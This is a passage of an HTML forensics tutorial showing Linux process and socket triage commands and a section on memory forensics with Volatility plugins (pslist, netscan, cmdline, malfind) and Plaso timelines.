ps auxf | grep -v "\[" | awk '{print $1, $11}' | sort -u
<span class="cm"># Linux: unusual L3/L4 network connections</span>
ss -tulnp | grep -v "127.0.0.1"</code></pre>
  </div>
</details>
<details class="tier advanced">
  <summary>🔴 Advanced — Memory Forensics &amp; Timeline</summary>
  <div class="tier-body">
    <h4>Advanced Artifact Analysis</h4>
    <ul>
      <li>Volatility: dump L7 process memory, extract L3 network connections from RAM, find injected code</li>
      <li>Plaso/log2timeline: build a super-timeline correlating L7 events across all log sources</li>
      <li>Key: match L3 IP from auth log to L7 process that spawned the connection (netstat + Sysmon)</li>
    </ul>
    <pre><code><span class="cm"># Volatility memory forensics (L7 process artifacts)</span>
vol -f memory.raw windows.pslist          <span class="cm"># L7 process list</span>
vol -f memory.raw windows.netscan         <span class="cm"># L3/L4 connections in RAM</span>
vol -f memory.raw windows.cmdline         <span class="cm"># L7 command line args</span>
vol -f memory.raw windows.malfind         <span class="cm"># L7 injected code detection</span></code></pre>
  </div>
</details>
</article>
